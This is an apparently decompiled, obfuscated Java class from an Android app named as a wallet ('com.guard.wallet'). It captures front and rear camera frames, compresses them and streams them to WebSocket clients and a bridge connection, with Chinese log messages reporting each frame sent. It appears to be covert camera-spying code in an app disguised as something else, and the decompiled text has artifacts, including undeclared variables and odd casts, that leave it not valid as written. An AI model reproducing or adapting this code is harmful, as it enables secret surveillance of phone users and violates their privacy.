package m;

import a1.q;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.Image;
import android.media.ImageReader;
import android.media.ImageReader.OnImageAvailableListener;
import android.util.Log;
import com.guard.wallet.utils.g;
import java.nio.ByteBuffer;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;

public final class f implements OnImageAvailableListener {
   public final int a;

   public f(int var1) {
      this.a = var1;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void onImageAvailable(ImageReader var1) {
      Image var6 = var1.acquireLatestImage();
      if (var6 != null) {
         boolean var3;
         int var4;
         boolean var19;
         label216: {
            label221: {
               var3 = false;
               var4 = this.a;
               if (Objects.equals(0, var4)) {
                  if (Integer.valueOf(com.guard.wallet.server.c.G().A.size()) > 0) {
                     break label221;
                  }

                  com.guard.wallet.bridge.a var15 = q.f;
                  if (var15 != null && var15.w.get()) {
                     var19 = (boolean)1;
                  } else {
                     var19 = (boolean)0;
                  }

                  if (var19) {
                     break label221;
                  }
               }

               if (Objects.equals(1, var4)) {
                  if (Integer.valueOf(com.guard.wallet.server.c.G().B.size()) > 0) {
                     break label221;
                  }

                  com.guard.wallet.bridge.a var16 = q.g;
                  if (var16 != null && var16.w.get()) {
                     var19 = (boolean)1;
                  } else {
                     var19 = (boolean)0;
                  }

                  if (var19) {
                     break label221;
                  }
               }

               Log.d("m.f", "不需要发送摄像头画面");
               var19 = 0;
               break label216;
            }

            var19 = 1;
         }

         if (var19) {
            Bitmap var17 = null;

            label189: {
               Bitmap var27;
               try {
                  ByteBuffer var7 = var6.getPlanes()[0].getBuffer();
                  var19 = var7.capacity();
                  byte[] var5 = new byte[var19];
                  var7.get(var5);
                  var27 = BitmapFactory.decodeByteArray(var5, 0, var19, null);
               } catch (Exception var14) {
                  q.s("BitmapUtils", var14);
                  break label189;
               }

               var17 = var27;
            }

            byte[] var28 = g.M0(var17, 0.8F, 80);
            if (Objects.equals(0, var4)) {
               if (Integer.valueOf(com.guard.wallet.server.c.G().A.size()) > 0) {
                  com.guard.wallet.server.c var29 = com.guard.wallet.server.c.G();
                  var29.getClass();
                  label181:
                  if (var28 != null) {
                     Exception var10000;
                     label227: {
                        try {
                           var19 = var28.length;
                        } catch (Exception var13) {
                           var10000 = var13;
                           boolean var10001 = false;
                           break label227;
                        }

                        if (var19 <= 0) {
                           break label181;
                        }

                        ConcurrentLinkedQueue var30 = var29.A;

                        try {
                           if (var30.isEmpty()) {
                              break label181;
                           }

                           var31 = var30.iterator();
                        } catch (Exception var12) {
                           var10000 = var12;
                           boolean var42 = false;
                           break label227;
                        }

                        while (true) {
                           try {
                              if (!var31.hasNext()) {
                                 break label181;
                              }

                              ((e1.b)var31.next()).a(var28);
                           } catch (Exception var11) {
                              var10000 = var11;
                              boolean var43 = false;
                              break;
                           }
                        }
                     }

                     Exception var32 = var10000;
                     q.s("MyWebSocketServer", var32);
                  }

                  Log.d("m.f", "前置摄像头画面发送完成");
               }

               com.guard.wallet.bridge.a var33 = q.f;
               boolean var22;
               if (var33 != null && var33.w.get()) {
                  var22 = true;
               } else {
                  var22 = false;
               }

               if (var22) {
                  if (var28 != null && var28.length > 0) {
                     var33 = q.f;
                     if (var33 != null && var33.w.get()) {
                        var22 = true;
                     } else {
                        var22 = false;
                     }

                     if (var22) {
                        q.f.B(var28);
                     }
                  }

                  Log.d("m.f", "前置摄像头画面发送完成");
               }
            }

            if (Objects.equals(1, var4)) {
               if (Integer.valueOf(com.guard.wallet.server.c.G().B.size()) > 0) {
                  com.guard.wallet.server.c var35 = com.guard.wallet.server.c.G();
                  var35.getClass();
                  label137:
                  if (var28 != null) {
                     Exception var41;
                     label231: {
                        try {
                           var19 = var28.length;
                        } catch (Exception var10) {
                           var41 = var10;
                           boolean var44 = false;
                           break label231;
                        }

                        if (var19 <= 0) {
                           break label137;
                        }

                        ConcurrentLinkedQueue var36 = var35.B;

                        try {
                           if (var36.isEmpty()) {
                              break label137;
                           }

                           var37 = var36.iterator();
                        } catch (Exception var9) {
                           var41 = var9;
                           boolean var45 = false;
                           break label231;
                        }

                        while (true) {
                           try {
                              if (!var37.hasNext()) {
                                 break label137;
                              }

                              ((e1.b)var37.next()).a(var28);
                           } catch (Exception var8) {
                              var41 = var8;
                              boolean var46 = false;
                              break;
                           }
                        }
                     }

                     Exception var38 = var41;
                     q.s("MyWebSocketServer", var38);
                  }

                  Log.d("m.f", "后置摄像头画面发送完成");
               }

               com.guard.wallet.bridge.a var39 = q.g;
               boolean var25;
               if (var39 != null && var39.w.get()) {
                  var25 = true;
               } else {
                  var25 = false;
               }

               if (var25) {
                  if (var28 != null && var28.length > 0) {
                     var39 = q.g;
                     var25 = var3;
                     if (var39 != null) {
                        var25 = var3;
                        if (var39.w.get()) {
                           var25 = true;
                        }
                     }

                     if (var25) {
                        q.g.B(var28);
                     }
                  }

                  Log.d("m.f", "后置摄像头画面发送完成");
               }
            }

            g.J0(var17);
         }

         var6.close();
      }
   }
}
